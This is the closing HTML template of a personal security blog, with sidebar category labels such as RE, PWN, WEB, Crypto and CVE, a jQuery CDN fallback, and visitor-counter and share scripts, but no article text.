    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="二进制"><span class="iconfont-archer">&#xe60a;</span>二进制</span>
    
        <span class="sidebar-category-name" data-categories="RE"><span class="iconfont-archer">&#xe60a;</span>RE</span>
    
        <span class="sidebar-category-name" data-categories="WEB"><span class="iconfont-archer">&#xe60a;</span>WEB</span>
    
        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
    
        <span class="sidebar-category-name" data-categories="MISC"><span class="iconfont-archer">&#xe60a;</span>MISC</span>
    
        <span class="sidebar-category-name" data-categories="RW"><span class="iconfont-archer">&#xe60a;</span>RW</span>
    
        <span class="sidebar-category-name" data-categories="balabala"><span class="iconfont-archer">&#xe60a;</span>balabala</span>
    
        <span class="sidebar-category-name" data-categories="FE"><span class="iconfont-archer">&#xe60a;</span>FE</span>
    
        <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
    
        <span class="sidebar-category-name" data-categories="CVE"><span class="iconfont-archer">&#xe60a;</span>CVE</span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "MozhuCY"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


